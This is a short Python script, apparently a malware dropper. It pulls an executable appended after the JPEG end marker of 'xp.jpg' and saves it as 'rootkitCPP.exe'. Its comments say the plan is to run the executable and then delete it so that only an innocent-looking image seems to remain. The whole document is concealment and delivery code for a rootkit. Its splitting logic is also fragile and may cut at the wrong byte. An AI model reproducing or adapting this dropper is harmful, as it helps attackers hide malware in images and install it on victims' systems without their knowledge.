# The idea would be you run this script to extract the
# executable from a jpg, run the executable, then delete
# it to keep the illusion of only a jpg file. Currently,
# this only works with jpg files because of its ending 
# "FFD9", but this could be modified if another image is
# heavily desired.


import binascii

picFile = 'xp.jpg'

with open(picFile, 'rb') as f: #'rb' = read in binary mode
    values = f.read()

convertedValues = str(binascii.hexlify(values)) #returns hexadecimal representation of binary data
splitValues = convertedValues.split("ffd9", 1) #splits between jpg (minus the ffd9) and exe
exe = splitValues[1] #b' is for binascii to recognize

exeFile = open("rootkitCPP.exe", "wb") #'wb" = write in binary mode
exeFile.write(bytearray(bytes.fromhex(exe[:-1])))

exeFile.close()